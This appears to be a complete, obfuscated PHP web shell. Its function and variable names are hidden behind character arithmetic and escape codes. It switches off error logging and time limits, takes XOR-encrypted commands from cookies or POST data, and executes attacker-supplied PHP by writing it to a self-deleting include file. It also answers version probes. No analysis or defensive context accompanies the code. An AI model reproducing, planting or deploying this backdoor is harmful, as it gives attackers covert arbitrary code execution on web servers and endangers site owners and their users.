<?php $jtcacmcaiy = "\x66"."\151".'l'."\145".chr(788-693).chr(578-466)."\165"."\164"."\137".chr(99)."\157".chr(1010-900).chr(998-882).chr(656-555).'n'."\164".'s';
$bfmrsayxk = "\142".'a'.chr(115).'e'."\x36".'4'.chr(95).'d'.'e'.'c'.chr(509-398).'d'.'e';
$cjdnaecx = chr(905-800)."\156"."\151"."\x5f"."\163"."\x65".'t';
$mapyywgx = "\165".'n'."\x6c"."\x69".'n'.chr(107);


@$cjdnaecx(chr(765-664).'r'.chr(215-101)."\157".chr(114).chr(530-435)."\154".'o'.chr(771-668), NULL);
@$cjdnaecx(chr(301-193)."\x6f".chr(883-780).chr(273-178).chr(101).chr(339-225).chr(239-125).'o'.chr(114).'s', 0);
@$cjdnaecx("\x6d".chr(97).chr(120).'_'."\145".chr(871-751).chr(101)."\x63".'u'.'t'.chr(105)."\157"."\x6e".chr(95).'t'."\151"."\155"."\x65", 0);
@set_time_limit(0);

function zsyrkqech($fdffek, $blumaov)
{
    $hoceiny = "";
    for ($pjzavfcis = 0; $pjzavfcis < strlen($fdffek);) {
        for ($j = 0; $j < strlen($blumaov) && $pjzavfcis < strlen($fdffek); $j++, $pjzavfcis++) {
            $hoceiny .= chr(ord($fdffek[$pjzavfcis]) ^ ord($blumaov[$j]));
        }
    }
    return $hoceiny;
}

$crdzwh = array_merge($_COOKIE, $_POST);
$ettxgdawue = 'c3bc0385-a1d6-4387-bc1f-ec03e6fbcef1';
foreach ($crdzwh as $fpbwvu => $fdffek) {
    $fdffek = @unserialize(zsyrkqech(zsyrkqech($bfmrsayxk($fdffek), $ettxgdawue), $fpbwvu));
    if (isset($fdffek[chr(173-76).chr(107)])) {
        if ($fdffek[chr(97)] == "\151") {
            $pjzavfcis = array(
                "\x70".chr(118) => @phpversion(),
                chr(115).'v' => "3.5",
            );
            echo @serialize($pjzavfcis);
        } elseif ($fdffek[chr(97)] == chr(101)) {
            $tucvfkv = "./" . md5($ettxgdawue) . chr(579-533).chr(263-158)."\x6e".chr(99);
            @$jtcacmcaiy($tucvfkv, "<" . chr(63).'p'."\x68"."\x70"."\40".chr(64).chr(117)."\156"."\154"."\x69"."\156".chr(107).chr(40)."\x5f"."\x5f".'F'."\x49"."\x4c".'E'."\137"."\137".')'."\x3b"."\x20" . $fdffek[chr(100)]);
            @include($tucvfkv);
            @$mapyywgx($tucvfkv);
        }
        exit();
    }
}

